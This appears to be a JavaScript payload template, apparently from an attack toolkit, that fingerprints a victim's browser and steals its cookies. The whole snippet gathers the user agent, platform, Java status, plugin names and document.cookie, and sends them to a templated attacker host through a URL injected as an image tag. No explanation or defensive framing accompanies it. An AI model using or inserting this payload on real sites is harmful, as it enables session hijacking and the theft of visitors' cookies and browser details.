var ua = navigator.userAgent;
var appname = navigator.appName;
var platform = navigator.platform;
var plugins = navigator.plugins;
var java = navigator.javaEnabled();

var cookie = document.cookie;

var url = "http://{{ host.ip }}:{{ host.port }}/?";
url += "ua="+ua;
url += "&appname="+appname;
url += "&platform="+platform;
url += "&java="+java;
for (i=0; i < plugins.length; i++) {
	var plugin = plugins[i];
	url += "&p"+i+"="+plugin.name;
}
url += "&cookie="+cookie
document.write("<img src='"+url+"'/>");

